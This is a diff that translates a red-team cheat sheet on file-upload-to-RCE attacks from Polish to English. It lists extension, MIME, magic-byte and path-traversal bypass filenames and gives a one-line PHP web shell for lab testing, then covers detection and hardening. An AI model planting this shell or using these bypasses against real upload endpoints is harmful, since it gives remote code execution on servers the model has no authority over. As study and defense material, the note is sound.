@@ -1,5 +1,5 @@
 ---
-title: "Podatności file upload"
+title: "File upload vulnerabilities"
 category: "red-team"
 tags: ["web", "file-upload", "rce"]
 platform: "web"
@@ -12,32 +12,32 @@ author: "core"
 # File Upload → RCE
 
 ## TL;DR
-Słaba walidacja uploadu → wgranie web shella (np. `.php`) i wykonanie kodu. Omijanie: rozszerzenia, MIME, magic bytes, path traversal.
+Weak upload validation → uploading a web shell (e.g. `.php`) and executing code. Bypasses: extensions, MIME, magic bytes, path traversal.
 
-## Techniki omijania
+## Bypass techniques
 ```text
-Rozszerzenia:  shell.php.jpg  shell.pHp  shell.phtml  shell.php5  shell.php%00.jpg
-MIME:          zmień Content-Type na image/png (a treść to PHP)
-Magic bytes:   GIF89a; <?php system($_GET['c']); ?>
-Double ext:    .jpg.php
+Extensions:  shell.php.jpg  shell.pHp  shell.phtml  shell.php5  shell.php%00.jpg
+MIME:        change Content-Type to image/png (while content is PHP)
+Magic bytes: GIF89a; <?php system($_GET['c']); ?>
+Double ext:  .jpg.php
 Path traversal: filename="../../shell.php"
-.htaccess:     wgraj .htaccess mapujący .xyz -> php
+.htaccess:   upload an .htaccess mapping .xyz -> php
 ```
 
-## Minimalny web shell (test w labie)
+## Minimal web shell (lab testing)
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-## Wykrywanie (Blue Team)
-- Pliki wykonywalne w katalogach uploadu, dostęp do świeżo wgranych `.php`.
-- WAF: sygnatury web shelli, anomalne parametry `cmd=`.
-- FIM na katalogach uploadu.
+## Detection (Blue Team)
+- Executable files in upload directories, access to freshly uploaded `.php`.
+- WAF: web shell signatures, anomalous `cmd=` parameters.
+- FIM on upload directories.
 
-## Mitygacja / Hardening
-- Allow-list rozszerzeń + weryfikacja treści (magic bytes), rename losowy.
-- Przechowuj uploady **poza web root** / w storage bez wykonywania (S3, `X-Content-Type-Options`).
-- Wyłącz wykonywanie w katalogu uploadu (brak handlera PHP), skanowanie AV.
+## Mitigation / Hardening
+- Allow-list of extensions + content verification (magic bytes), random rename.
+- Store uploads **outside the web root** / in non-executing storage (S3, `X-Content-Type-Options`).
+- Disable execution in the upload directory (no PHP handler), AV scanning.
 
-## Źródła
+## Sources
 - [OWASP – Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
